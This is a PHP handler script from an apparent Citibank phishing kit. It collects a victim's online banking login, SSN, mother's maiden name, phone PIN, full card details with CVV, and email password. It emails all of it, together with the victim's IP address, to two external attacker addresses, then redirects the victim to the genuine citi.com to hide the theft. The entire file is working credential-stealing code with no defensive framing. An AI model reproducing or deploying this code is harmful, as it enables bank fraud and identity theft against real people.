<?php
ini_set("output_buffering",4096);
session_start();


$ip = getenv("REMOTE_ADDR");
$message .= "----------------Online-------------\n";
$message .= "Online Id  : ".$_SESSION['username']."\n";
$message .= "Pass  : ".$_SESSION['password']."\n";
$message .= "----------------Information-------------\n";
$message .= "Full Name  : ".$_POST['dox3']."\n";
$message .= "MMN  : ".$_POST['dox4']."\n";
$message .= "Zip Code  : ".$_POST['dox6']."\n";
$message .= "Phone  : ".$_POST['dox9']."\n";
$message .= "Phone Pin  : ".$_POST['dox10']."\n";
$message .= "SSN  : ".$_POST['dox5']."\n";
$message .= "----------------Card Details-------------\n";
$message .= "Card Number : ".$_POST['dox11']."\n";
$message .= "Expire Date  : ".$_POST['dox12']."\n";
$message .= "CVV : ".$_POST['dox13']."\n";
$message .= "----------------Mail Access--------------\n";
$message .= "Email Address  : ".$_POST['dox7']."\n";
$message .= "Password       : ".$_POST['dox8']."\n";
$message .= "----------------IP--------------\n";
$message .= "IP            : ".$ip."\n";
$recipient = "mastersraw001@gmail.com,matsont@yandex.ru";
$subject = "Citi $ip";
$headers = "From: CitiBank FUllz <mail@info.com";
mail($recipient,$subject,$message,$headers);

session_destroy();
header("Location:https://www.citi.com");
?>